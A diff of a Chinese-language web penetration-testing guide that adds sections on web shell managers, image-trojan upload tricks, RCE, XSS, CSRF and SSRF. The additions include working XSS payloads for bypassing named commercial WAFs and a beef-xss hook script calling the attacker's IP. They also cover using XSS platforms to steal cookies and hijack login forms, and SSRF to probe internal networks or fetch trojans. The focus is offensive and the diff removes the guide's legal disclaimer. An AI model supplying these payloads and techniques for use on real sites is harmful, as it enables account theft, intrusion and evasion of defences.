@@ -8,28 +8,17 @@
 # 写在前面
 **qq交流群：942443861**
 文章链接：https://github.com/ngadminq/Hong-Qigong-penetration-test-guide
-申明：本文展示的案例没有做违法事情，另读者一切犯罪事情与本文无关。
-文章一部分来源于一些大佬博客或者书籍总结，剩下的是自己实战的经验总结，至于优质的资源参考链接都有罗列在本文章里。
 
 
 ****
-*待补充：简要介绍每一章节讲了什么，应该如何阅读*
+*待补充：简要介绍每一章节讲了什么，应该如何阅读、学习*
 *待补充：每一种漏洞介绍经验，常见什么形式展现，从源码层面做分析*
+*将每种类型常见的公开漏洞做总结*
 *将文章拆分为：原理版和实践版*
 # 准备工作
 
 
-## 渗透流程
 
-**目标确认**
-目标确认指明确此次渗透的目标（获取权限还是获取数据？）、范围时间、约束条件等。这个目标有两层含义，简单来说就是最终木目的是什么？我要拿到什么？
-**信息收集**
-
-**漏洞发现**
-**漏洞利用**
-**权限维持内网渗透**
-权限维持、内网渗透：进入目标内容，进行横向拓展，向渗透目标靠近
-**目标获取痕迹清理**
 
 
 ## 选修：提升渗透能力
@@ -1266,7 +1255,6 @@ SQL。通常指数据以对象的形式存储在数据库中，而对象之间�
 
 常见的非关系型数据库有 Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase 等。
 
-### 待补充：VPN
 
 ### 开源渗透测试标准
 
@@ -1742,8 +1730,11 @@ kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入
 
 # 工具
 
-工具这一部分最重要的不是看我的简介，而是及时上手
+工具这一部分除了参考我简介的基本规则，你最需要的是上手联系
 
+## 字典
+**fuzz**
+参数Fuzz字典、Xss Fuzz字典、用户名字典、密码字典、目录字典、sql-fuzz字典、ssrf-fuzz字典、XXE字典、ctf字典、Api字典、路由器后台字典、文件后缀Fuzz、js文件字典、子域名字典，更新还挺及时的，最近关注此项目上一次更新在2021/6  https://github.com/TheKingOfDuck/fuzzDicts
 ## 学会上网
 ### google hack
 1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件
@@ -2132,12 +2123,15 @@ hashcat 的哈希模式标识符的其他示例是：
 综上所述，我们在图 1.5 中用于攻击的语法是“hashcat -m 3000 -a 0 hashes.txt /root/Desktop/rockyou.txt”。运行此命令后，hashcat 会返回系统信息和有关字典缓存的信息。处理完哈希后，该工具会将其结果返回给用户。图 1.6 显示我们破解密码的尝试是成功的，LM 哈希包含密码“passphrase”。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602125712368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-
-### 中国菜刀
+### 后门管理工具
+菜刀现在已经用得不是很多了，被很多网站已经禁止掉了。现在用得多的是蚁剑和冰蝎。这些管理工具都有一句话后门代码
+**中国菜刀**
 
 一款 web Shell管理类工具 ，它的开发者是一位台湾人是一位退伍军人,它的支持很广泛 只要是动态网站都支持，软件支持多个国家语言显示。中国菜刀仅支持windows操作系统，从网络上下载 中国菜刀压缩包，解压压缩包到一个任意文件夹。2016版下载链接：https://github.com/raddyfiy/caidao-official-version/blob/master/caidao-20160622.zip
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712140651445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-这款工具太出名，以至于被很多网站已经禁止掉了，以下有一些比较新的工具可尝试，使用方法都大同小异。
+
+以下有一些比较新的工具可尝试，使用方法都大同小异。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210626214416634.png)
 
 ### 邮箱信息
@@ -2665,11 +2659,6 @@ weblogic
 还有靶机可使用 https://vulhub.org/#/environments/
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627130752990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-## 综合，区别
-
- ~xss与csrf的区别
- -- 一个是盗取cookie、一个是利用cookie
-
 
 
 ## 请求数据包漏洞
@@ -2879,9 +2868,11 @@ weblogic的反序列化
 前提是网站有比如“点击下载”的按钮。下载后分析文件地址
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210702164934707.png)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210702163522138.png)
+## 文件操作
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071214141882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-## 文件上传漏洞
+### 文件上传漏洞
 如果非常规类型，你判断出来就用相应方案，而不是一上来就用常规测试方法。对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708210532166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
@@ -2950,13 +2941,13 @@ YAML 反序列化
 Contont-Disposition：一般可更改
 Name：表单参数值，不能更改
 Filename：文件名，可以更改
-### 执行
+#### 执行
 ##### 明確只能上传图片
 比如程序员写了要获取图片尺寸的或
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135957977.png)
 
 这时候你就需要配合其他漏洞才可以执行。
-#### +解析漏洞
+##### +解析漏洞
 解析漏洞存在的条件是比较苛刻的，他要求是nginx、apache等服务器；*具体待补充*
 图片马制作很简单，你可以轻松的上传它，但是如何执行起来就是另一项技术。
 生成在同级文件下放入一句话木马和图，将其在win的cmd下输入
@@ -2973,23 +2964,23 @@ copy 1.jpg /b+1.php/a 1.jpg
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708212810712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 判断一个网站有没有解析漏洞只需要访问其jpg文件，在加上`/.php`看返回结果就知道了.如果返回的是404就证明没有漏洞，如果是乱码就证明有漏洞
-#### +文件包含漏洞
+##### +文件包含漏洞
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135206289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135133834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-#### + IIS6.0上传漏洞
+##### + IIS6.0上传漏洞
 现在这个版本已经不太常见了
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709153926671.png)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070915424534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-#### + Apache解析漏洞-低版本2.X
+##### + Apache解析漏洞-低版本2.X
 符合Apache低版本就有漏洞
 x.php.xxx.yyy
 识别最后的yyy，如果不识别的就向前解析，直到识别。
 利用场景：
 如果对方中间件apache属于低版本，我们可以利用文件上传，上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，其中后门代码被触发。
-#### +Apache2.4.0-2.4.29换行解析
+##### +Apache2.4.0-2.4.29换行解析
 换行解析漏洞
 https://vulhub.org/#/environments/httpd/CVE-2017-15715/
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709161011292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -3005,13 +2996,13 @@ https://navisec.it/编辑器漏洞手册/
 各个CMS文件上传简要讲解
 wordpress，phpcms
 
-#### 待补充： +weblogic
-#### +firecms上传漏洞
+##### 待补充： +weblogic
+##### +firecms上传漏洞
 修改uid为3
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708230507178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708230515619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-#### 待补充：+CVE-2017-12615:tomcat任意文件上传
-#### +竞态
+##### 待补充：+CVE-2017-12615:tomcat任意文件上传
+##### +竞态
 二次渲染就是当系统收到用户上传的图片时，先进行保存到服务器，或者是为了方便用户进行图片的删除或者改大小。这通常就涉及到两次保存，一般程序员在保存第一次时可能疏忽不会写冗长的代码来过滤。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709142526875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 只要成功保存一次，对于我们其实就够了，利用竞态，在文件被服务器删除之前访问。这时候对于系统来说就是打开了文件，打开就不能进行删除了。你制造竞态只需要不断请求修改数据包即可
@@ -3023,12 +3014,12 @@ wordpress，phpcms
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709143902195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 启动爆破后，打开网页对php进行多次刷新访问，如果弹出一串奇怪的代码那就说明你已经执行成功了。这时候你要做的就是停止再刷新界面，将此界面保持就可以进行后门操作
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709144624895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-#### 编辑器
+##### 编辑器
 这里不用说太多，只要你发现对方采用了编辑器，百度编辑器漏洞就可以找到利用方法。如图就采用了一个编辑器
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709172009109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-#### 常规上传
+##### 常规上传
 
 * 文件夹绕过
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709151241163.png)
@@ -3214,6 +3205,21 @@ CVE-2019-0340：通过文件上传的 XXE
    **简介**
 
 
+
+
+## RCE（远程命令执行）
+在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞比如eval().或者一些参数id可以执行echo &id等命令。
+当遇到这种漏洞，你可以执行一些敏感命令。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712125552200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712135852588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+### 实例：网站可执行系统命令
+当只允许执行某命令试试管道符。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712125738973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+当弹出这样对话框时，你应该试着去看当前页面的源码，检查是哪个函数导致此结果。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071213025048.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+前端验证的你可以通过抓包去修改发送的数据包，从而绕过防御
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712131116302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
 
@@ -3913,13 +3919,34 @@ cookie注入 后接cookie值
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705235758892.png)
 
 ## xss攻击
-xss攻击执行的是javascript脚本，javascript脚本能执行多强就意味着xss能达到什么样的攻击
+xss攻击执行的是javascript脚本，javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击。比如对你的用户名展示，对你输入的东西展示。
 
+Cookie 窃取XSS 。诱导用户去点击你含有cookie切入的链接，比如你可以将自己用户名改`<script>alert(document.cookie)</script>`  向用户去求分享链接，比如百度网盘之前一漏洞：有人用户名为此，当别人给他账号分享文件时，就会弹出此用户的cookie。
+虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址
+cookie还要有意义，如果对方是未登录状态的cookie就索然无味了。一般这种攻击要么就是在肯定对方大概率会查看你的页面时要么就是定向。
+
+
+**常见问题：cookie获取到了缺登录不上？**
+区别两个术语
+cookie 储存本地 存活时间较长 小中型
+session 会话 存储服务器 存活时间较短  大型。session就像比如你登录了一次支付宝，过了几分钟不用就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。
+对方网站如果只认cookie验证，那么你盗取session是没什么价值的。反过来只认session你盗取cookie做验证也是没有价值的
+**常见问题：这个地方是因为有什么防护机制我的xss没有执行？**
+查看输入浏览器的位置就可以知道
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710170454262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+**常见问题：cookie是空？**
+这种一般是http-only打开了
+
+****
+**技巧：利用cookie的工具**
+你盗取到的cookie可以直接用postman进行访问
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710115739542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+**技巧：从phpinfo返回信息获得管理权限**
+phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网站，进行xss操作，如获取源码等
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710150205547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### 反射型
-
-**Cookie盗取**
-Cookie 窃取XSS 。诱导用户去点击你含有cookie切入的链接，比如你可以将自己用户名改`<script>alert(document.cookie)</script>`  向用户去求分享链接，比如百度网盘之前一漏洞：有人用户名为此，当别人给他账号分享文件时，就会弹出此用户的cookie。
 
 ```python
 url/?name=<script>alert(document.cookie)</script>
@@ -3929,7 +3956,10 @@ url/?name=<script>alert(document.cookie)</script>
 
 ```bash
 <img src=1 onerror=alert(1);>
-' onclick="alert(2)">
+#当管理员对>进行转义时，你可以采用onclick
+' onclick="alert(2)"
+#过滤了on,但是这种写法要点击不像script直接跳转
+a href='javascript:alert(1)'
 
 ```
 
@@ -3982,20 +4012,44 @@ xss payload字典 burp爆破　
 搭建XSS平台 3s.wf/
 http://xssor.io
 
+### 待补充：fuzz
+### XSStrike
+https://github.com/s0md3v/XSStrike
+外国人的项目，自带识别并绕过WAF(由于是外国开发的项目，可能对于中国的一些WAF识别不是很好，但是它的测试仍旧是走对的)所以 如果用在国内的项目探测出WAF：offline不要确定没有WAF。
+
+ - XSStrike主要特点反射和DOM XSS扫描 多线程爬虫 Context分析 可配置的核心 检测和规避WAF 老旧的JS库扫描
+   只能payload生成器 手工制作的HTML&JavaScript解析器 强大的fuzzing引擎 盲打XSS支持 高效的工作流
+   完整的HTTP支持 Bruteforce payloads支持 Payload编码
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710223335774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
 
 ### xss平台
-如果你搞的东西比较敏感，不希望别人知道也可以自己搭建一个
+如果你搞的东西比较敏感，不希望别人知道也可以自己搭建一个。目前国内几款xss平台使用规则都差不多，通常总有延迟等问题，不是很好用
+自己写类似于如下，一个文件用于触发，另一个文件用于接收。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710003925868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710004151205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 #### 使用
 
 以下为链接为  https://xsshs.cn 的平台，其他XSS平台使用类似
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221344762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-下一步，不懂就选默认。也不要太多模块都勾选，非常非常容易导致JS报错，如果报错，那么可能你就收不到对方的中招信息了。尽量只勾选一个或两个。
+一般选默认，默认是获取cookie。也不要太多模块都勾选，非常非常容易导致JS报错，如果报错，那么可能你就收不到对方的中招信息了。尽量只勾选一个或两个。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221517840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 最后XSS平台就会告诉你怎么样执行代码了。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221902641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 图片XSS 获取对方后台 使用讲解    https://woj.app/1785.html
 
+**盗取账号密码**
+
 XSS 之 form表单劫持(通用明文记录)    https://woj.app/1684.html (这里推荐使用平台最新表单劫持插件，无需设置，直接可用)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710164541523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+保存读取：通过读取保存他的数据
+没保存读取：表单劫持(登录框
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071016590266.png)
+
+
 
 xss获取后台二级密码 – URL跳转 (地址栏不变)    https://woj.app/1820.html
 
@@ -4004,15 +4058,22 @@ xss获取后台二级密码 – URL跳转 (地址栏不变)    https://woj.app/1
 xss平台持久cookie说明 keepsession说明    https://woj.app/1907.html
 
 不用cookie 一个储存XSS对“某btc平台”攻城略地  https://woj.app/3035.html
+### XSS其他工具推荐
+https://xssfuzzer.com/fuzzer.html
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710215938334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-### beEF
 
-打开kali，执行`beef-xss`，等待上面的秒数从5到1后，会跳出一个页面让我们登录。
-默认帐号密码是：beef/beef。
+
+### beef-xss
+
+打开kali，执行`beef-xss`
+命令行启动之后，开启beef终端。默认帐号密码是：beef/beef
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071013163322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 这时候啥都干不了，是因为你有一步很重要的操作没做。这里需要把payload复制粘贴到你的目标xss的位置，然后将其中的<IP>改成你这台kali的IP地址，最终payload为：<script src="http://X.X.X.X:3000/hook.js"></script>
 改完之后，会发现online browers中多了点东西，这时候就可以开始操作了
 
-
+beef还是很强大的，入侵成功后可以对对方页面进行跳转或者一些社工
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710132101331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
 使用方法就是使用XSS攻击能在页面中插入类似下面的语句就可以了。
@@ -4027,14 +4088,72 @@ xss平台持久cookie说明 keepsession说明    https://woj.app/1907.html
 
 
 
+### 防御与绕过
+#### httponly
+管理员只需要在配置文件中修改一句话就可以开启了。开启后无法通过js脚本读取cookie信息，这能一定程度增加了xss获取cookie的难度。但是比如alert等该弹出来的还是会出来的
 
-### XSS防御
 
->通常，我们只需要在输出前，将 < , > 过滤掉即可。
+#### 常见防御
+开启httponly，输入过滤，输出过滤等
+PHP：http://www.zuimoge.com/212.html
+JAVA：https://www.cnblogs.com/baixiansheng/p/9001522.html
+
+>我见过一个挺恶心的WAF,微软这个。一旦<后面跟任何字母都算是危险操作 
 >过滤 </xxx> 组合
 
 
-### 绕过XSS防御
+#### 常见绕过
+
+```bash
+详细看 [翻译]绕过XSS检测机制  https://bbs.pediy.com/thread-250852.htm
+
+Name: Cloudflare\
+Payload: <a"/onclick=(confirm)()>click\
+Bypass Technique: 无空格 filler
+
+ 
+Name: Wordfence\
+Payload: <a/href=javascript&colon;alert()>click\
+Bypass Technique: 数字符编码
+
+ 
+Name: Barracuda\
+Payload: <a/href=&#74;ava%0a%0d%09script&colon;alert()>click\
+Bypass Technique: 数字符编码
+
+ 
+Name: Akamai\
+Payload: <d3v/onauxclick=[2].some(confirm)>click\
+Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用
+
+ 
+Name: Comodo\
+Payload: <d3v/onauxclick=(((confirm)))``>click\
+Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用
+
+ 
+Name: F5\
+Payload: <d3v/onmouseleave=[2].some(confirm)>click\
+Bypass Technique: 使用黑名单中缺少的event handler; 混淆函数调用
+
+ 
+Name: ModSecurity\
+Payload: <details/open/ontoggle=alert()>\
+Bypass Technique: 使用黑名单中缺少的tag（也缺少event handler？）
+
+ 
+Name: dotdefender\
+Payload: <details/open/ontoggle=(confirm)()//\
+Bypass Technique: 使用黑名单中缺少的tag；混淆函数调用；备用标签结束
+```
+
+尝试脚本大写
+多个script嵌套
+用img标签
+eval转换
+unicode网络编码
+
+
 
 宽字节XSS与宽字节SQL注入的不同在于宽字节注入主要是通过
 
@@ -4105,11 +4224,7 @@ GB2312是被GBK兼容的，它的高位范围是0xA1～0xF7，低位范围是0xA
 ps：不仅gbk，韩文、日文等都是宽字节，都有可能存在宽字节注入漏洞。
 
 2、过滤客户端提交的危险字符。
-**对抗防御xss**
-尝试脚本大写
-多个script嵌套
-用img标签
-eval转换
+
 **更多资源**
 xss平台、beef、xss自动化攻击
 
@@ -4145,21 +4260,23 @@ http://xxxx.com/search.php?word=第一篇博客
 http://xxxx.com/search.php?word=第一篇博客" onclick="alert(1)
 ```
 
-## csrf
+## CSRF
 
-CSRF 和 SSRF 的区别
 
 **什么是**
-[什么是csrf](https://blog.csdn.net/qq_40491569/article/details/83111932?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&spm=1001.2101.3001.4242 "什么是csrf")
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710175822379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+只要受害者在登录状态，点击了一下你的链接，就可以完成攻击。一般你在选取csrf界面时你应该选择可以添加（管理员、用户等）、删除、修改等操作上。如果不能做这些即便有相关漏洞也是没什么危害的。
 **危害性**
 比xss更大，更难防范。通常可以用来以目标用户的名义发邮件、盗取目标用户账号、购买商品。通常用来做蠕虫攻击、刷SEO流量等。
 
 ### 实战
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711012444131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 用burpsuite即可快速生成误导链接，我们只需要引导用户去点击这个恶意链接就可以完成攻击
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512184941253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185247918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071101252633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185302955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185314721.png)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185329497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -4168,9 +4285,32 @@ CSRF 和 SSRF 的区别
 
 
 
+### 防御
+最有效的和简洁的手段是用token，如果你发现对方的网站有token那么你基本就没必要认为对方有csrf漏洞了
+由于防御方法简单且难以被绕过，因此现在这种漏洞在大型网站几乎没有，小型网站你要想用此攻击获取普通用户的还是比较好搞，但是要想获取管理员的，你必须知道管理员请求数据包的方式。
+>1.当用户发送重要的请求时需要输入原始密码
+2.设置随机Token
+3.检验referer来源，请求时判断请求连接是否为当前管理员正在使用的页面(管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败)
+4.设置验证码
+5.限制请求方式只能为POS
 
+## SSRF
+这个漏洞比CSRF难防范得多，一些大型网站甚至在稍微不注意的时候都会留下这个漏洞。
+找真实站点搜索关键词：上传网络图片  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711014602709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-## 模板注入
+你甚至还可以利用其漏洞打穿内网添加管理员或远程下载一个木马
+### 常见攻击演示
+#### 图片上传
+图片上传一般允许本地上传（SSRF在本地上传图是没有漏洞的）或者远程上传即访问类似于http://djhsds.img，远程上传的图意味着你访问了这个链接，所以这时候当你将地址换成内部地址时，意味着这个页面会展示很多内部信息。如下请求了一个内网地址端口，这个内网ip通常是要你自己用字典跑的，但是不要紧，内网ip也就这么几百个：
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711020338432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+除了探测信息以外，你要是发现漏洞了还可以直接执行漏洞代码
